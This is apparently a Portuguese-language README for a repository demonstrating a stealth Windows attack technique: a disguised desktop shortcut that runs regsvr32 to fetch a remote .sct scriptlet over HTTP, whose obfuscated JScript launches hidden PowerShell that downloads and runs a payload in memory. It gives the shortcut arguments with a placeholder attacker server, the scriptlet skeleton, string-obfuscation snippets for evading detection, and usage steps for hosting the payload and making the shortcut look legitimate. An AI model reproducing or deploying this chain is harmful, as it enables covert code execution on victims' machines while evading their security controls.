# Técnica de Execução Stealth do PowerShell

Este repositório demonstra uma técnica avançada de stealth para execução de scripts PowerShell que contorna controles de segurança comuns. A implementação utiliza objetos COM, arquivos SCT e ofuscação de strings para evitar detecção enquanto executa scripts PowerShell remotos.

## Visão Geral

Esta técnica aproveita o regsvr32.exe, um binário legítimo do Windows, para carregar e executar um arquivo scriptlet (.sct) hospedado remotamente que contém código JavaScript ofuscado. Este código então executa comandos PowerShell de maneira altamente evasiva.

## Componentes

### 1. Atalho na Área de Trabalho

O ponto de entrada é um atalho do Windows com as seguintes propriedades:

```powershell
Destino: %windir%\System32\regsvr32.exe
Argumentos: /s /u /i:http://[ip-servidor]/[nome-script].sct scrobj.dll
Ícone: %SystemRoot%\System32\devmgr.dll,0
Estilo da Janela: Minimizada
```

### 2. Estrutura do Arquivo SCT

O arquivo SCT (Scriptlet) contém código JScript ofuscado usando múltiplas técnicas de evasão:

```xml
<?XML version="1.0"?>
<scriptlet>
<registration progid="TESTING" classid="{10001111-0000-0000-0000-0000FEEDACDC}">
<script language="JScript">
<![CDATA[
    // Código de execução ofuscado
]]>
</script>
</registration>
</scriptlet>
```

### 3. Técnicas de Evasão

A implementação usa múltiplas camadas de evasão:

- **Inversão de Strings**: Strings como "powershell.exe" são armazenadas invertidas para evitar detecção
  ```javascript
  function d(s){return s.split('').reverse().join('');}
  var p = d("exe.llehsrewop");
  ```

- **Conversão de Código de Caracteres**: Strings críticas são construídas a partir de códigos de caracteres
  ```javascript
  var cmd = String.fromCharCode(73,69,88,...);
  ```

- **Expansão de Variáveis de Ambiente**: Usa variáveis de ambiente para construir caminhos do sistema
  ```javascript
  var x = a.ExpandEnvironmentStrings(d("%RIDNIW%"));
  var e = x + d("23metsyS\\");
  ```

- **Execução Oculta**: Usa `-WindowStyle Hidden` para prevenir janelas visíveis do PowerShell

### 4. Cadeia de Execução

A cadeia completa de execução é:

1. Usuário clica no atalho
2. regsvr32.exe carrega o arquivo .sct remoto via HTTP
3. O código JScript executa com comandos ofuscados
4. PowerShell é chamado com janela oculta
5. PowerShell baixa e executa o script payload diretamente na memória

## Uso

1. Hospede o arquivo .sct em um servidor HTTP
2. Hospede seu payload PowerShell como "teste.ps1" no mesmo servidor
3. Crie o atalho usando o script gerador fornecido
4. O ícone e o nome do atalho podem ser personalizados para parecerem legítimos

## Detalhes Técnicos

### Parâmetros do regsvr32

- `/s`: Execução silenciosa (sem diálogos)
- `/u`: Desregistra componente (usado como parte da técnica)
- `/i:<URL>`: Especifica o script a ser carregado
- `scrobj.dll`: O Script Component Runtime que processa o scriptlet

### Considerações de Segurança

Esta técnica é eficaz em contornar controles de segurança porque:

1. regsvr32 é um binário confiável do Windows (técnica living-off-the-land)
2. Nenhum arquivo é escrito no disco (execução sem arquivos)
3. Múltiplas camadas de ofuscação de string previnem detecção estática
4. A execução do PowerShell fica oculta para o usuário
5. Usa objetos COM legítimos do Windows para execução

